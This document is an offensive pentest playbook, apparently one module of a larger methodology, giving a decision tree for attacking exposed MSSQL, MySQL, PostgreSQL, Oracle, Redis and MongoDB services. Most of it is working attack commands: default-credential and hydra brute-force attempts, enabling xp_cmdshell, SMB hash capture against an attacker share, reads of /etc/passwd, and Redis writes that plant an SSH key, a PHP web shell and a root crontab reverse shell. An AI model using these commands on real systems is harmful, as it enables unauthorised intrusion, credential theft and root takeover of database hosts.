# Database Attack Flow

## Entry Conditions
- Port identified for database service (1433, 3306, 5432, 1521, 6379, 27017)
- OR database credentials obtained from web app/config file

## Decision Tree

```
Database port identified
│
├── MSSQL (port 1433)
│   ├── [AUTH TYPE] Windows Auth or SQL Auth?
│   │   ├── Windows Auth → Need domain credentials → [Module 11]
│   │   └── SQL Auth
│   │       ├── Default credentials: sa:sa, sa:(empty), sa:password
│   │       │   ├── SUCCESS → SQL Server command execution
│   │       │   │   ├── xp_cmdshell present?
│   │       │   │   │   ├── YES → EXEC xp_cmdshell 'whoami'
│   │       │   │   │   │   └── [→ Reverse shell / RCE]
│   │       │   │   │   └── NO/Disabled → Try to enable:
│   │       │   │   │       EXEC sp_configure 'show advanced options', 1
│   │       │   │   │       RECONFIGURE
│   │       │   │   │       EXEC sp_configure 'xp_cmdshell', 1
│   │       │   │   │       RECONFIGURE
│   │       │   │   │       └── SUCCESS → Command execution
│   │       │   │   │       └── FAIL → Try alternatives
│   │       │   │   │
│   │       │   │   ├── xp_cmdshell alternatives:
│   │       │   │   │   ├── xp_dirtree → SMB hash capture
│   │       │   │   │   │   EXEC xp_dirtree '\\attacker\share'
│   │       │   │   │   ├── sp_OACreate → COM object execution
│   │       │   │   │   ├── CLR assembly → .NET code execution
│   │       │   │   │   ├── Agent job → Scheduled task RCE
│   │       │   │   │   └── Extended stored procedures
│   │       │   │   │
│   │       │   │   └── Linked servers?
│   │       │   │       SELECT * FROM OPENQUERY(<link>, 'SELECT @@version')
│   │       │   │       └── [→ Lateral movement via linked servers]
│   │       │   │
│   │       │   └── Data extraction:
│   │       │       ├── SELECT name FROM sys.databases
│   │       │       ├── SELECT * FROM sys.server_principals
│   │       │       ├── SELECT * FROM master.sys.sql_logins
│   │       │       └── Dump application databases
│   │       │
│   │       └── FAIL → Brute force
│   │           └── hydra -l sa -P rockyou.txt mssql://target
│   │
│   └── [POST-EXPLOIT]
│       ├── Service account → Check domain join
│       ├── Implemented commands → Reverse shell
│       └── Linked servers → Pivot to other DB servers
│
├── MySQL (port 3306)
│   ├── Default credentials: root:root, root:(empty)
│   │   ├── SUCCESS → MySQL command execution
│   │   │   ├── Current user: SELECT current_user()
│   │   │   ├── Privileges: SHOW GRANTS
│   │   │   ├── FILE privilege?
│   │   │   │   ├── YES → SELECT LOAD_FILE('/etc/passwd')
│   │   │   │   │   └── Read: /etc/passwd, SSH keys, config files
│   │   │   │   └── SELECT ... INTO OUTFILE → Write webshell
│   │   │   │       └── [→ RCE if web path writable]
│   │   │   ├── UDF exploit?
│   │   │   │   └── Plugin dir writable? → Custom UDF → RCE
│   │   │   └── Data extraction:
│   │   │       ├── SELECT host,user,plugin FROM mysql.user
│   │   │       ├── SELECT authentication_string FROM mysql.user
│   │   │       ├── SELECT user,password FROM mysql.user (old versions)
│   │   │       └── Dump application databases
│   │   │
│   │   └── FAIL → Brute force
│   │       └── hydra -l root -P rockyou.txt mysql://target
│   │
│   └── [NOTE] MySQL root ≠ OS root — need UDF or OUTFILE for RCE
│
├── PostgreSQL (port 5432)
│   ├── Default credentials: postgres:postgres
│   │   ├── SUCCESS → PostgreSQL exploitation
│   │   │   ├── COPY FROM PROGRAM → OS RCE (best path)
│   │   │   │   COPY (SELECT 'test') TO PROGRAM 'whoami'
│   │   │   │   └── [→ Reverse shell / command execution]
│   │   │   ├── LOAD → C extension (if writable dir)
│   │   │   ├── Read files: pg_read_file() (superuser)
│   │   │   ├── Write files: pg_write_file() (superuser)
│   │   │   └── Data extraction: Dump application databases
│   │   │
│   │   └── FAIL → Brute force
│   │       └── hydra -l postgres -P rockyou.txt postgres://target
│   │
│   └── [NOTE] COPY FROM PROGRAM requires superuser or pg_execute_server_program
│
├── Oracle (port 1521)
│   ├── Default credentials: system:manager, scott:tiger
│   ├── TNS poisoning → odat.py
│   ├── Authenticated?
│   │   ├── Execute OS commands via Java procedures
│   │   ├── Extract password hashes from DB
│   │   └── Dump application data
│   └── FAIL → odat.py password guessing
│
├── Redis (port 6379)
│   ├── [NO AUTH REQUIRED] (most common)
│   │   ├── keys * → List ALL keys
│   │   ├── CONFIG GET * → Get configuration
│   │   ├── SSH key write:
│   │   │   CONFIG SET dir /root/.ssh
│   │   │   CONFIG SET dbfilename authorized_keys
│   │   │   SET sshkey "<ssh_pub_key>"
│   │   │   SAVE
│   │   │   └── [→ SSH as root to host]
│   │   ├── Web shell write:
│   │   │   CONFIG SET dir /var/www/html
│   │   │   CONFIG SET dbfilename shell.php
│   │   │   SET shell "<?php system($_GET['c']); ?>"
│   │   │   SAVE
│   │   │   └── [→ Web shell → RCE]
│   │   ├── Crontab write (Linux):
│   │   │   CONFIG SET dir /var/spool/cron/crontabs
│   │   │   CONFIG SET dbfilename root
│   │   │   SET cron "* * * * * bash -i >& /dev/tcp/ip/port 0>&1"
│   │   │   SAVE
│   │   │   └── [→ Reverse shell as root]
│   │   └── Dump database content (may contain creds)
│   │
│   └── Auth enabled? → Try redis-cli -a <password>
│       └── FAIL → Brute force with hydra
│
├── MongoDB (port 27017)
│   ├── [NO AUTH] (common in older configs)
│   │   ├── show dbs → List databases
│   │   ├── use admin → Admin database
│   │   ├── db.getUsers() → List users
│   │   ├── db.system.users.find() → Password hashes
│   │   └── Dump all databases for credentials
│   │
│   └── Auth enabled? → Try common creds: admin:admin
│       └── FAIL → Brute force
│
└── [POST-DATABASE] Unify next steps
    ├── Credentials found? → [→ Module 06 / Module 12]
    ├── RCE achieved? → [→ Shell upgrade → Module 13]
    ├── Data extracted? → [→ Evidence collection → Module 14]
    └── Domain access? → [→ Module 11]

## Database Exploitation Priority

| DB | RCE Method | Reliability | Priority |
|----|-----------|-------------|----------|
| MSSQL | xp_cmdshell | Very High | 1 |
| Redis | SSH key write | High | 1 |
| PostgreSQL | COPY FROM PROGRAM | High | 2 |
| MySQL | INTO OUTFILE | Medium | 2 |
| MongoDB | No RCE (data only) | N/A | 3 |
| Oracle | Java procedures | Medium | 3 |

## Cross-References
- Web app SQLi → [Module 04](../modules/04-web-application.md)
- Shells/payloads after DB RCE → [Module 05](../modules/05-initial-access.md)
- Lateral movement via DB creds → [Module 12](../modules/12-lateral-pivot.md)
- Credential cracking → [Module 06](../modules/06-password-attacks.md)
- Attack Graph navigation → [Module 99](../modules/99-attack-graph.md)
